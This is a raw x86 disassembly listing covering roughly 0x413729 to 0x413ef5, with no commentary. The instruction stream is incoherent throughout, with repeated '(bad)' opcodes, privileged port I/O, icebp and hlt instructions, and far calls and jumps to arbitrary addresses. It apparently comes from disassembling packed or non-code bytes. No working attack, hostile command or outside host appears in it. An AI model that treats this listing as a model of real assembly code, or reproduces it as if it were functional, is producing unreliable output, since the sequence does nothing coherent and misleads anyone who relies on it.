  413729:	mov    es:0x9ba06828,eax
  41372f:	icebp  
  413730:	sti    
  413731:	sar    edx,0xb7
  413734:	cli    
  413735:	mov    DWORD PTR [ebx-0x2e],0xb4f7a034
  41373c:	aad    0xf3
  41373e:	pushf  
  41373f:	inc    ebp
  413740:	pop    ebp
  413741:	lods   eax,DWORD PTR ds:[esi]
  413742:	or     eax,0x3123f785
  413747:	inc    ecx
  413748:	mov    es,WORD PTR [ebp+0x56]
  41374b:	into   
  41374c:	jae    0x41374d
  41374e:	test   DWORD PTR [ebp+0x5e03cf88],edi
  413754:	dec    edx
  413755:	stc    
  413756:	jl     0x4137a1
  413758:	xchg   ecx,eax
  413759:	mov    DWORD PTR [edx],ebx
  41375b:	add    eax,0xc5e4eeea
  413760:	mov    edx,0xe5c1d389
  413765:	push   0xdf17b33b
  41376a:	ret    
  41376b:	mov    esp,0xa7fcc098
  413770:	ins    DWORD PTR es:[edi],dx
  413771:	pop    esi
  413772:	jmp    0x4137d4
  413774:	call   0x59cfd74a
  413779:	sbb    al,0x5a
  41377b:	push   edx
  41377c:	imul   ebx,DWORD PTR [ebp-0x3d],0xffffff9b
  413780:	pop    eax
  413781:	sbb    dl,al
  413783:	push   eax
  413784:	add    DWORD PTR [edx+eax*1],ebp
  413787:	jecxz  0x4137ce
  413789:	inc    eax
  41378a:	jno    0x41376e
  41378c:	btr    DWORD PTR [ebx],edi
  41378f:	pop    ebx
  413790:	mov    ebx,0x77e01404
  413795:	adc    eax,0x59a4612f
  41379a:	test   cl,0xeb
  41379d:	es enterw 0x5c74,0x85
  4137a3:	jge    0x413749
  4137a5:	mov    eax,ds:0x34b16ffe
  4137aa:	cwde   
  4137ab:	xor    BYTE PTR [edx-0x3ff5e06d],dl
  4137b1:	(bad)  
  4137b2:	jecxz  0x413743
  4137b4:	jge    0x4137da
  4137b6:	push   es
  4137b7:	sbb    BYTE PTR [edi-0x1],dl
  4137ba:	call   0xc58788f9
  4137bf:	push   0xffffffa6
  4137c1:	mov    edx,0x604d2675
  4137c6:	push   cs
  4137c7:	out    0xa5,eax
  4137c9:	mov    ch,0x9b
  4137cb:	add    al,0x99
  4137cd:	dec    eax
  4137ce:	cld    
  4137cf:	or     eax,0xc9d6a431
  4137d4:	int    0x2d
  4137d6:	aad    0x79
  4137d8:	stos   DWORD PTR es:[edi],eax
  4137d9:	mov    DWORD PTR [ecx-0x4225b14c],esi
  4137df:	call   0xa5f8d8ee
  4137e4:	xlat   BYTE PTR ds:[ebx]
  4137e5:	xlat   BYTE PTR ds:[ebx]
  4137e6:	dec    eax
  4137e7:	sub    DWORD PTR [ebx],ebp
  4137e9:	sar    DWORD PTR [ebx+ecx*1-0x14b45cf0],cl
  4137f0:	or     al,0x74
  4137f2:	mov    edx,0xf09cf04c
  4137f7:	adc    al,0x9a
  4137f9:	or     al,0xe5
  4137fb:	nop
  4137fc:	mov    eax,ds:0xcad9f900
  413801:	and    edx,ebp
  413803:	stos   BYTE PTR es:[edi],al
  413804:	(bad)  
  413805:	xor    dh,BYTE PTR [eax-0xeeed941]
  41380b:	popa   
  41380c:	pop    ebx
  41380d:	mov    ah,0xa5
  41380f:	add    al,0xea
  413811:	cmc    
  413812:	retf   
  413813:	jnp    0x4137ac
  413815:	add    cl,BYTE PTR [edi+0x43c359d2]
  41381b:	mov    ecx,0xadfb3c69
  413820:	push   esi
  413821:	add    DWORD PTR [edi+0x52dc441f],eax
  413827:	add    DWORD PTR [esi],edi
  413829:	mov    edx,0xc97dace6
  41382e:	dec    esi
  41382f:	stos   BYTE PTR es:[edi],al
  413830:	icebp  
  413831:	popa   
  413832:	mov    ebx,0x188767ab
  413837:	enter  0x7128,0xa9
  41383b:	inc    edx
  41383c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41383d:	jmp    0x413811
  41383f:	push   ecx
  413840:	sbb    eax,0xf1657a80
  413845:	cld    
  413846:	sahf   
  413847:	loop   0x4137ce
  413849:	dec    ebx
  41384a:	push   edi
  41384b:	and    eax,0xd478853
  413850:	mov    cl,0x64
  413852:	jo     0x4138cf
  413854:	frstor [esi]
  413856:	sub    BYTE PTR [ecx-0x5ed9b62f],dh
  41385c:	sub    al,BYTE PTR [ebx]
  41385e:	call   DWORD PTR [ebx]
  413860:	jl     0x413885
  413862:	outs   dx,BYTE PTR ds:[esi]
  413863:	mov    ah,0x3d
  413865:	push   ebx
  413866:	mov    ecx,0x34834239
  41386b:	adc    dl,BYTE PTR [ebp+0x2d]
  41386e:	sti    
  41386f:	dec    esi
  413870:	fs pushf 
  413872:	lea    esp,[esi]
  413874:	test   eax,0xb0fbea73
  413879:	(bad)  
  41387a:	pop    ecx
  41387b:	je     0x4138f8
  41387d:	loopne 0x413844
  41387f:	xchg   ebx,eax
  413880:	xor    al,0xb2
  413882:	inc    edi
  413883:	inc    edx
  413884:	popf   
  413885:	std    
  413886:	loope  0x413848
  413888:	jo     0x4138b1
  41388a:	dec    edi
  41388b:	cmp    BYTE PTR [ecx],bl
  41388d:	pop    ecx
  41388e:	jg     0x41387e
  413890:	pop    es
  413891:	mov    eax,0x522fa9f8
  413896:	jae    0x41386f
  413898:	cmp    DWORD PTR ds:0x643bef1c,ebp
  41389e:	mov    BYTE PTR [edi-0x2a312a77],bl
  4138a4:	adc    edx,DWORD PTR [ecx+0x36623db9]
  4138aa:	fucomi st,st(6)
  4138ac:	inc    DWORD PTR [eax]
  4138ae:	push   ds
  4138af:	jae    0x41385d
  4138b1:	adc    al,0x6d
  4138b3:	daa    
  4138b4:	pop    esp
  4138b5:	in     eax,0x2c
  4138b7:	ds pop es
  4138b9:	pop    DWORD PTR [ecx]
  4138bb:	ins    DWORD PTR es:[edi],dx
  4138bc:	jl     0x41387e
  4138be:	(bad)  
  4138bf:	xchg   edx,eax
  4138c0:	inc    edi
  4138c1:	loopne 0x413861
  4138c3:	outs   dx,DWORD PTR ds:[esi]
  4138c4:	pop    ds
  4138c5:	mov    ds:0x85cb07e6,al
  4138ca:	rcr    DWORD PTR [edx],0x5
  4138cd:	les    eax,FWORD PTR [ecx+eax*1+0x44]
  4138d1:	and    al,0x7
  4138d3:	xor    ah,BYTE PTR cs:[ecx-0x3f3c468b]
  4138da:	pop    esp
  4138db:	adc    eax,0x8e66374d
  4138e0:	test   BYTE PTR [ebp-0x72],0x7b
  4138e4:	cli    
  4138e5:	ror    BYTE PTR [ebp+0x48cd384f],cl
  4138eb:	inc    esi
  4138ec:	cmp    al,0x9a
  4138ee:	mov    fs,ebp
  4138f0:	mov    al,0x76
  4138f2:	aas    
  4138f3:	jle    0x413951
  4138f5:	cs add eax,0xd4aa54bc
  4138fb:	inc    edx
  4138fc:	dec    cx
  4138fe:	fisub  WORD PTR ds:0xa59c0d4d
  413904:	mov    esp,0x6ff14b89
  413909:	repnz hlt 
  41390b:	dec    esp
  41390c:	repnz (bad) [eax+edi*2+0x69a7ef5b]
  413914:	imul   eax,edx,0xfffffff8
  413917:	add    eax,edx
  413919:	pop    es
  41391a:	push   edx
  41391b:	sub    al,0x39
  41391d:	add    al,0xef
  41391f:	pop    edx
  413920:	aam    0xaf
  413922:	pop    edx
  413923:	add    eax,0xc9782455
  413928:	xchg   ebp,eax
  413929:	xor    cl,BYTE PTR [edx-0x6]
  41392c:	and    DWORD PTR [esi],esi
  41392e:	adc    eax,0xf4e7be7d
  413933:	xchg   esp,eax
  413934:	nop
  413935:	mov    ch,0x5d
  413937:	int    0x91
  413939:	ficomp WORD PTR [ecx+0x24]
  41393c:	inc    esp
  41393d:	xchg   BYTE PTR [ecx+0x24],al
  413940:	call   0x30b8d552
  413945:	test   al,0x93
  413947:	push   DWORD PTR [eax]
  413949:	test   BYTE PTR [esi-0x59],ch
  41394c:	jle    0x413964
  41394e:	imul   edi,edx,0x93d6f73c
  413954:	xor    BYTE PTR [ebp+0x4f00011d],bl
  41395a:	ins    DWORD PTR es:[edi],dx
  41395b:	or     al,0xd4
  41395d:	inc    esp
  41395e:	addr16 push 0x4fc483ac
  413964:	call   0x5b0a9a67
  413969:	mov    esp,ds
  41396b:	fwait
  41396c:	mov    edi,0xd879cad9
  413971:	call   0xad21:0xe636cf8
  413978:	imul   eax,ebx,0xfffffff6
  41397b:	fs in  al,dx
  41397d:	mov    ebp,0xfe4a136d
  413982:	xchg   edi,eax
  413983:	adc    al,0x20
  413985:	iret   
  413986:	es pop esi
  413988:	inc    esi
  413989:	mov    edi,0x396a7598
  41398e:	xor    edx,DWORD PTR [eax+eax*8-0x7f]
  413992:	inc    DWORD PTR [ebx+eax*8+0x57]
  413996:	sub    al,0xb3
  413998:	and    al,BYTE PTR gs:[esi-0x6a711d47]
  41399f:	pop    es
  4139a0:	popf   
  4139a1:	mov    ss,edx
  4139a3:	ficom  DWORD PTR [ebx-0x2f]
  4139a6:	sar    DWORD PTR [ecx-0x21],0xc6
  4139aa:	ja     0x41394b
  4139ac:	jmp    0x413941
  4139ae:	and    ecx,DWORD PTR [eax+esi*8]
  4139b1:	jp     0x413967
  4139b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139b5:	push   ebp
  4139b6:	cli    
  4139b7:	mov    eax,0x7a66c307
  4139bc:	xchg   ebx,eax
  4139bd:	pop    ecx
  4139be:	or     al,0xe7
  4139c0:	call   0x5feb:0xe63e0fab
  4139c7:	je     0x4139ab
  4139c9:	xor    BYTE PTR ds:0x39a18af1,bl
  4139cf:	rcr    BYTE PTR cs:[edx+eax*8+0x61],0x34
  4139d5:	bound  ebx,QWORD PTR [eax+0x6f0fb9e0]
  4139db:	fisub  WORD PTR ds:0x5dc0086b
  4139e1:	add    al,0xbd
  4139e3:	pop    ebx
  4139e4:	add    ch,BYTE PTR [ebp+0x1e]
  4139e7:	mov    fs,WORD PTR [esi-0x1ad46498]
  4139ed:	repz inc ecx
  4139ef:	add    dl,BYTE PTR [ecx-0x50]
  4139f2:	adc    ebx,DWORD PTR [ebx]
  4139f4:	xchg   DWORD PTR ds:0x5d6a11f7,ebx
  4139fa:	int    0xb0
  4139fc:	pusha  
  4139fd:	test   BYTE PTR [edi-0x3d],bl
  413a00:	ret    
  413a01:	push   ebp
  413a02:	das    
  413a03:	out    0x57,eax
  413a05:	ror    BYTE PTR [edx+0x55],0x67
  413a09:	xchg   edx,eax
  413a0a:	scas   al,BYTE PTR es:[edi]
  413a0b:	pop    eax
  413a0c:	xlat   BYTE PTR ds:[ebx]
  413a0d:	aam    0x70
  413a0f:	add    eax,DWORD PTR [edi]
  413a11:	inc    eax
  413a12:	jnp    0x4139ef
  413a14:	xchg   esp,eax
  413a15:	inc    ebp
  413a16:	cs pop ss
  413a18:	call   0xd269021b
  413a1d:	jmp    0xac1b:0xff595366
  413a24:	(bad)  
  413a25:	mov    ecx,0xdc7cba13
  413a2a:	mov    ecx,0xe99cadf7
  413a2f:	jnp    0x4139e3
  413a31:	adc    ah,dh
  413a33:	cld    
  413a34:	pusha  
  413a35:	repnz rol edx,1
  413a38:	pop    esp
  413a39:	std    
  413a3a:	out    dx,al
  413a3b:	repnz sbb al,0x2e
  413a3e:	in     al,0xec
  413a40:	or     bl,BYTE PTR [edx+eiz*8-0x6efa727a]
  413a47:	push   es
  413a48:	lds    edx,FWORD PTR [esp+esi*2-0x67]
  413a4c:	mov    ?,WORD PTR [edx+0x29]
  413a4f:	and    al,0xa5
  413a51:	retf   0xc309
  413a54:	xor    DWORD PTR [edi+edx*4-0x9],0x3
  413a59:	cwde   
  413a5a:	aam    0x19
  413a5c:	mov    eax,ds:0xbbb862d3
  413a61:	mov    bh,0xd2
  413a63:	inc    esp
  413a64:	fwait
  413a65:	or     bh,BYTE PTR [ebx+0x2a]
  413a68:	into   
  413a69:	pop    es
  413a6a:	dec    ebx
  413a6b:	xor    al,0xba
  413a6d:	and    al,BYTE PTR [edx]
  413a6f:	int3   
  413a70:	adc    cl,BYTE PTR [edi-0x36]
  413a73:	and    eax,0x53b373ce
  413a78:	mov    ds:0x319bd86f,eax
  413a7d:	and    DWORD PTR [edi-0x42],0x9f2ca9d8
  413a84:	or     edi,DWORD PTR [eax+0xff4b67b]
  413a8a:	mov    bl,cl
  413a8c:	push   esi
  413a8d:	or     al,0x53
  413a8f:	jae    0x413a51
  413a91:	cs scas al,BYTE PTR es:[edi]
  413a93:	in     al,dx
  413a94:	ror    BYTE PTR [edi+0x6b72bad0],0xbd
  413a9b:	adc    esp,DWORD PTR [ecx]
  413a9d:	cmp    ch,0xe1
  413aa0:	xchg   esi,eax
  413aa1:	popa   
  413aa2:	stc    
  413aa3:	fistp  DWORD PTR [ecx-0x444f52b9]
  413aa9:	mov    ds,WORD PTR [ecx]
  413aab:	test   al,0x12
  413aad:	rcl    al,cl
  413aaf:	xchg   ebx,ebx
  413ab1:	inc    esi
  413ab2:	mov    ebp,0xcbcdc55e
  413ab7:	(bad)  
  413ab8:	jno    0x413ab4
  413aba:	sbb    DWORD PTR [ebx-0x55e3f9e7],edx
  413ac0:	(bad)  
  413ac1:	bound  edi,QWORD PTR [edx-0x1eabef39]
  413ac7:	push   esi
  413ac8:	ds xchg esp,eax
  413aca:	in     al,0xfd
  413acc:	inc    esp
  413acd:	pusha  
  413ace:	call   0xc351:0x51aeb1e8
  413ad5:	addr16 aas 
  413ad7:	les    ebp,FWORD PTR [ecx]
  413ad9:	cwde   
  413ada:	js     0x413b2c
  413adc:	fwait
  413add:	push   ds
  413ade:	or     BYTE PTR [edx-0x4e],ah
  413ae1:	xchg   DWORD PTR [bx+si+0x5f],eax
  413ae5:	hlt    
  413ae6:	xor    al,BYTE PTR [ebx+0x590e7065]
  413aec:	fs loope 0x413aab
  413aef:	cmc    
  413af0:	dec    edi
  413af1:	loope  0x413aee
  413af3:	add    al,0x8f
  413af5:	xchg   DWORD PTR gs:[esi-0x47],ecx
  413af9:	dec    esp
  413afa:	sub    eax,esp
  413afc:	enter  0x316b,0x92
  413b00:	les    ebx,FWORD PTR [eax]
  413b02:	sti    
  413b03:	mov    cl,BYTE PTR [esi-0x420ea0eb]
  413b09:	mov    bh,0x26
  413b0b:	mov    eax,DWORD PTR [eax+0x4eb01720]
  413b11:	jmp    0xe2be6b97
  413b16:	sub    DWORD PTR [ebx+ebp*2-0x3b1dca06],ecx
  413b1d:	out    dx,al
  413b1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b1f:	cmp    bl,BYTE PTR [esi+0x18]
  413b22:	shr    DWORD PTR [ebx],0x26
  413b25:	xchg   al,ah
  413b27:	into   
  413b28:	push   eax
  413b29:	daa    
  413b2a:	repnz repz inc edi
  413b2d:	lods   eax,DWORD PTR ds:[esi]
  413b2e:	cmp    DWORD PTR [ebx],edi
  413b30:	and    eax,0x3f4f55c3
  413b35:	pop    es
  413b36:	mov    bl,0x2d
  413b38:	scas   eax,DWORD PTR es:[edi]
  413b39:	aaa    
  413b3a:	xor    edi,esp
  413b3c:	sti    
  413b3d:	(bad)  [edx+0x6b]
  413b40:	sbb    al,cl
  413b42:	mov    eax,0x781bf0e8
  413b47:	xor    BYTE PTR [ebx],dl
  413b49:	mov    ds:0x2a227291,eax
  413b4e:	ret    
  413b4f:	ror    ah,0x2
  413b52:	ins    BYTE PTR es:[edi],dx
  413b53:	dec    esi
  413b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b55:	mov    dl,0xf9
  413b57:	mov    edi,0x59e8fdd1
  413b5c:	addr16 (bad) 
  413b5e:	pop    ss
  413b5f:	sbb    al,0xee
  413b61:	rcl    BYTE PTR [esi],1
  413b63:	loop   0x413b05
  413b65:	pop    esp
  413b66:	imul   BYTE PTR [ebp-0x4505777c]
  413b6c:	push   0xffffff87
  413b6e:	mov    WORD PTR [esi-0x416268d7],gs
  413b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b75:	dec    esp
  413b76:	sub    eax,0x383d6f68
  413b7b:	cli    
  413b7c:	or     dh,BYTE PTR [eax-0x21]
  413b7f:	and    al,0xc6
  413b81:	(bad)  
  413b82:	icebp  
  413b83:	outs   dx,BYTE PTR ds:[esi]
  413b84:	fisubr WORD PTR [ebx+0x69]
  413b87:	xlat   BYTE PTR ds:[ebx]
  413b88:	daa    
  413b89:	gs popf 
  413b8b:	hlt    
  413b8c:	pop    ss
  413b8d:	stc    
  413b8e:	adc    eax,DWORD PTR [esi]
  413b90:	mov    eax,ds:0x3641e13b
  413b95:	in     al,0x72
  413b97:	mov    WORD PTR [edi+ebx*1-0x35766053],?
  413b9e:	lea    edi,[edx]
  413ba0:	enter  0x8368,0x8d
  413ba4:	adc    DWORD PTR [esi+0x21],0xffffffd5
  413ba8:	dec    ecx
  413ba9:	mov    ds:0x23f832c7,eax
  413bae:	sbb    esp,DWORD PTR [edi]
  413bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bb1:	push   esp
  413bb2:	inc    edi
  413bb3:	pusha  
  413bb4:	add    eax,0xfe4ebdc8
  413bb9:	pop    ebx
  413bba:	xor    DWORD PTR [ebx],eax
  413bbc:	inc    esi
  413bbd:	jns    0x413c2d
  413bbf:	inc    ecx
  413bc0:	xor    al,BYTE PTR [edx-0x68]
  413bc3:	hlt    
  413bc4:	shl    DWORD PTR [ebx-0x621e294d],cl
  413bca:	sbb    al,0x2
  413bcc:	xor    BYTE PTR [eax-0x1241cd5c],al
  413bd2:	jae    0x413bde
  413bd4:	jne    0x413bae
  413bd6:	push   0x39
  413bd8:	mov    esi,DWORD PTR [eax]
  413bda:	fidivr WORD PTR [ecx+0x26]
  413bdd:	xor    al,dh
  413bdf:	pop    ecx
  413be0:	loope  0x413bc2
  413be2:	sbb    DWORD PTR [ebp-0x7e],edi
  413be5:	pop    ds
  413be6:	mov    ebp,0x352dd167
  413beb:	std    
  413bec:	cmp    dh,BYTE PTR fs:[edx]
  413bef:	push   esp
  413bf0:	jmp    0xa2:0xfa77d74a
  413bf7:	push   edx
  413bf8:	lds    ebx,FWORD PTR [esi]
  413bfa:	stos   DWORD PTR es:[edi],eax
  413bfb:	test   eax,0x5b64f8a9
  413c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c01:	dec    ebp
  413c02:	test   BYTE PTR [ecx],al
  413c04:	ja     0x413c75
  413c06:	xchg   ebp,eax
  413c07:	mov    edi,0x564ce30f
  413c0c:	mov    al,ds:0xf246a161
  413c11:	adc    al,0x22
  413c13:	stc    
  413c14:	jmp    0x413baf
  413c16:	mov    edx,0x9c923ab6
  413c1b:	retf   0x4be4
  413c1e:	repz inc ebx
  413c20:	popf   
  413c21:	dec    esi
  413c22:	jl     0x413c64
  413c24:	xor    dl,BYTE PTR [edi+0x44]
  413c27:	lods   eax,DWORD PTR ds:[esi]
  413c28:	xchg   ecx,eax
  413c29:	add    eax,0xc83d33aa
  413c2e:	inc    ebx
  413c2f:	retf   
  413c30:	push   cs
  413c31:	loope  0x413c03
  413c33:	dec    esi
  413c34:	lods   eax,DWORD PTR ds:[esi]
  413c35:	add    eax,DWORD PTR [ebx+esi*1-0x12]
  413c39:	xor    al,0xac
  413c3b:	out    dx,eax
  413c3c:	mov    ecx,0x83965015
  413c41:	mov    ds:0x9acabd80,al
  413c46:	stos   BYTE PTR es:[edi],al
  413c47:	ret    
  413c48:	inc    ebp
  413c49:	fadd   QWORD PTR [esi]
  413c4b:	inc    edi
  413c4c:	cwde   
  413c4d:	outs   dx,DWORD PTR ds:[esi]
  413c4e:	lods   al,BYTE PTR ds:[esi]
  413c4f:	sub    BYTE PTR [ebp+0x19],ah
  413c52:	sub    dl,bl
  413c54:	pop    eax
  413c55:	xor    ebp,eax
  413c57:	test   DWORD PTR ds:0xdf890de3,esi
  413c5d:	jle    0x413cb9
  413c5f:	popf   
  413c60:	jno    0x413c64
  413c62:	mov    DWORD PTR [eax+0x3adefcc7],ecx
  413c68:	jmp    0x47cfb8db
  413c6d:	sbb    ecx,ebp
  413c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c70:	aam    0xc7
  413c72:	pop    ss
  413c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c74:	adc    ebx,DWORD PTR [ecx-0x23]
  413c77:	inc    DWORD PTR [eax-0x13]
  413c7a:	fcomp  DWORD PTR [edi]
  413c7c:	mov    ds,ebx
  413c7e:	loop   0x413ccd
  413c80:	imul   edx,DWORD PTR [bp-0x49],0xf146986f
  413c88:	dec    edx
  413c89:	mov    edx,0x8d69190e
  413c8e:	mov    bh,0xbb
  413c90:	jmp    0x413ccb
  413c92:	mov    dl,0x3a
  413c94:	pop    ebp
  413c95:	popa   
  413c96:	lock out dx,eax
  413c98:	mov    ds:0xb27f092c,eax
  413c9d:	or     eax,0x1e867448
  413ca2:	loop   0x413c2e
  413ca4:	int    0x8
  413ca6:	sbb    BYTE PTR [edi-0x3da2c438],ah
  413cac:	dec    esi
  413cad:	jne    0x413c5d
  413caf:	cwde   
  413cb0:	jb     0x413c9c
  413cb2:	sar    BYTE PTR [ebx],cl
  413cb4:	stos   BYTE PTR es:[edi],al
  413cb5:	or     edx,DWORD PTR [esp+edx*1-0x77]
  413cb9:	push   ebp
  413cba:	test   BYTE PTR [esi],bl
  413cbc:	popf   
  413cbd:	repz ss jmp 0xbf73532e
  413cc4:	mov    ds:0x5034da7f,eax
  413cc9:	dec    esp
  413cca:	jo     0x413cac
  413ccc:	daa    
  413ccd:	inc    eax
  413cce:	pop    ecx
  413ccf:	mov    dh,0xa5
  413cd1:	fs call 0x7becd01c
  413cd7:	push   ss
  413cd8:	push   edi
  413cd9:	and    al,BYTE PTR [edi+0x54b36430]
  413cdf:	sub    eax,0xdb042811
  413ce4:	pop    es
  413ce5:	or     al,0xcd
  413ce7:	ss adc esp,edi
  413cea:	ret    
  413ceb:	mov    ebp,0x66b8a9eb
  413cf0:	jg     0x413d28
  413cf2:	fsqrt  
  413cf4:	ins    BYTE PTR es:[edi],dx
  413cf5:	push   eax
  413cf6:	fs pusha 
  413cf8:	rol    al,cl
  413cfa:	pop    ds
  413cfb:	call   0xd1dc7b69
  413d00:	enter  0x44e3,0xc5
  413d04:	in     al,dx
  413d05:	xlat   BYTE PTR ds:[ebx]
  413d06:	ret    
  413d07:	cld    
  413d08:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  413d0a:	(bad)  
  413d0c:	sub    BYTE PTR [ebx+esi*2-0x21],dl
  413d10:	repz rol DWORD PTR [eax+0x20f2b95c],0x8
  413d18:	dec    ebx
  413d19:	jne    0x413d42
  413d1b:	inc    esi
  413d1c:	call   0xf50d35d7
  413d21:	ja     0x413d64
  413d23:	das    
  413d24:	test   al,0xb
  413d26:	pop    edi
  413d27:	inc    esp
  413d28:	or     bl,ah
  413d2a:	jno    0x413d24
  413d2c:	mov    ds:0x89189b83,eax
  413d31:	out    0x9c,eax
  413d33:	sbb    ebp,eax
  413d35:	push   ds
  413d36:	lds    ebx,FWORD PTR [esi]
  413d38:	and    al,BYTE PTR [esi]
  413d3a:	jge    0x413d55
  413d3c:	leave  
  413d3d:	jp     0x413d80
  413d3f:	sub    eax,0x28bf4e8b
  413d44:	(bad)  
  413d45:	ficomp WORD PTR [eax+0x6]
  413d48:	loopne 0x413d0d
  413d4a:	rcr    BYTE PTR [edi],0x50
  413d4d:	(bad)  
  413d4e:	mov    ebp,0x3de47df1
  413d53:	call   0xc7895134
  413d58:	retf   0x7e2
  413d5b:	cli    
  413d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d5d:	jl     0x413d95
  413d5f:	sbb    BYTE PTR [ebp+0x363d0877],ch
  413d65:	jp     0x413d08
  413d67:	dec    ecx
  413d68:	fisubr WORD PTR [edi+0x3d72da73]
  413d6e:	or     BYTE PTR [edi-0x2],0x89
  413d72:	call   0x4506:0x5061b40f
  413d79:	addr16 sub ebx,0x4fb92039
  413d80:	out    dx,eax
  413d81:	jno    0x413dc2
  413d83:	pop    es
  413d84:	or     eax,0x1c8f6e7c
  413d89:	stos   DWORD PTR es:[edi],eax
  413d8a:	icebp  
  413d8b:	adc    DWORD PTR [ebp+edx*1+0x3a],ecx
  413d8f:	pop    edi
  413d90:	sahf   
  413d91:	rcl    edx,cl
  413d93:	lahf   
  413d94:	push   ecx
  413d95:	and    DWORD PTR [esi-0x2f],eax
  413d98:	xchg   DWORD PTR [edx+0x851444a],esp
  413d9e:	dec    ecx
  413d9f:	mov    cl,0xd9
  413da1:	mov    esi,0x19dd7669
  413da6:	pop    eax
  413da7:	cmp    ecx,ebp
  413da9:	xor    DWORD PTR ds:0x6f966a05,esp
  413daf:	icebp  
  413db0:	jge    0x413dbf
  413db2:	dec    ebx
  413db3:	pop    ebx
  413db4:	ja     0x413d7c
  413db6:	or     al,0xd1
  413db8:	mov    al,0xec
  413dba:	daa    
  413dbb:	test   DWORD PTR [ebx-0x63889a0d],ebx
  413dc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dc2:	lods   al,BYTE PTR ds:[esi]
  413dc3:	stc    
  413dc4:	dec    eax
  413dc5:	in     al,dx
  413dc6:	jno    0x413dcf
  413dc8:	mov    edx,0x6862b84d
  413dcd:	inc    BYTE PTR [ebp-0x6cd97dd7]
  413dd3:	jae    0x413e26
  413dd5:	adc    bl,0xdd
  413dd8:	add    al,0x2b
  413dda:	test   eax,0x6b365750
  413ddf:	or     eax,0xd038d0f5
  413de4:	in     al,0xde
  413de6:	out    dx,eax
  413de7:	out    dx,al
  413de8:	(bad)  
  413de9:	add    BYTE PTR [ecx+0x24577843],dl
  413def:	push   0xc
  413df1:	and    edx,DWORD PTR [ecx]
  413df3:	inc    eax
  413df4:	or     al,0xe6
  413df6:	out    0x33,al
  413df8:	sbb    DWORD PTR [ebx],ecx
  413dfa:	sub    dl,ah
  413dfc:	push   0xffffffd7
  413dfe:	and    BYTE PTR [ebp+0x16],bl
  413e01:	inc    esp
  413e02:	ja     0x413e57
  413e04:	mul    cl
  413e06:	sbb    DWORD PTR [esp+ebp*1+0x10],edx
  413e0a:	(bad)  
  413e0b:	and    al,0xe7
  413e0d:	leave  
  413e0e:	push   cs
  413e0f:	inc    eax
  413e10:	lea    ebp,ds:0x5782bed5
  413e16:	js     0x413e1c
  413e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e19:	sbb    eax,0x62c648f9
  413e1e:	icebp  
  413e1f:	adc    al,0xd3
  413e21:	xchg   edx,eax
  413e22:	inc    DWORD PTR cs:[edx+0x258d71c7]
  413e29:	xor    BYTE PTR [ebx+0x748be4a1],bh
  413e2f:	outs   dx,DWORD PTR ds:[esi]
  413e30:	sbb    esi,DWORD PTR [esi-0x7c]
  413e33:	test   BYTE PTR [edi],0xc
  413e36:	sub    bh,dh
  413e38:	push   0xffffffb6
  413e3a:	sbb    al,0x88
  413e3c:	ss xchg ebx,eax
  413e3e:	inc    ebp
  413e3f:	xchg   DWORD PTR [eax-0x75],edx
  413e42:	push   edx
  413e43:	repz adc DWORD PTR [ebx-0x64],esi
  413e47:	lahf   
  413e48:	push   ebx
  413e49:	cmc    
  413e4a:	imul   edx,DWORD PTR [ecx-0x29430433],0xb3579054
  413e54:	sub    al,0xa5
  413e56:	addr16 (bad) 
  413e58:	cmp    cl,BYTE PTR [esp+edx*2-0x4]
  413e5c:	push   es
  413e5d:	xchg   esi,eax
  413e5e:	add    al,0xab
  413e60:	pop    edx
  413e61:	add    ebp,DWORD PTR [ebx+0x3af9d767]
  413e67:	lea    ebp,[edi]
  413e69:	dec    eax
  413e6a:	mov    cl,0xb7
  413e6c:	jle    0x413e6d
  413e6e:	ret    0x6305
  413e71:	sbb    bl,bl
  413e73:	mov    al,ds:0xb0570ae
  413e78:	add    esp,DWORD PTR [edx]
  413e7a:	adc    eax,0x78690294
  413e7f:	push   cs
  413e80:	imul   edi,DWORD PTR [edx],0x6f372a55
  413e86:	mov    ds:0x7c7dbd44,eax
  413e8b:	rcl    DWORD PTR [ebp-0x3],0x96
  413e8f:	add    al,0x5b
  413e91:	and    esp,DWORD PTR [edi+0x47]
  413e94:	retf   0x5c0d
  413e97:	rol    BYTE PTR [esi],cl
  413e99:	inc    esi
  413e9a:	pushf  
  413e9b:	or     DWORD PTR [esi+ebx*8+0x64e9771f],ebp
  413ea2:	add    DWORD PTR [edi],esp
  413ea4:	pop    es
  413ea5:	sahf   
  413ea6:	in     eax,dx
  413ea7:	in     al,0xef
  413ea9:	pushf  
  413eaa:	jbe    0x413e54
  413eac:	retf   0x711a
  413eaf:	(bad)  
  413eb0:	xor    dl,BYTE PTR [ecx+esi*4-0x9]
  413eb4:	bound  ebx,QWORD PTR ds:0x77d9342a
  413eba:	jae    0x413eb6
  413ebc:	sub    BYTE PTR ds:[ebp-0xd],0x34
  413ec1:	and    ebp,edi
  413ec3:	push   cs
  413ec4:	test   BYTE PTR [edx-0x30],ch
  413ec7:	xchg   ebp,eax
  413ec8:	jmp    0x413f41
  413eca:	adc    eax,0x3c05473c
  413ecf:	vhsubpd xmm1,xmm2,XMMWORD PTR [edx+0x7a]
  413ed4:	cmc    
  413ed5:	push   0xffffffb0
  413ed7:	add    eax,0x911d4f8a
  413edc:	xchg   esi,eax
  413edd:	in     al,0x67
  413edf:	push   edx
  413ee0:	add    bh,BYTE PTR [eax+0x7594f3e3]
  413ee6:	ins    BYTE PTR es:[edi],dx
  413ee7:	dec    esi
  413ee8:	dec    DWORD PTR [edx-0x26]
  413eeb:	fist   WORD PTR [esi-0x4b3f1c7a]
  413ef1:	stos   DWORD PTR es:[edi],eax
  413ef2:	mov    bl,0x7d
  413ef4:	hlt    
  413ef5:	xor    bl,dl
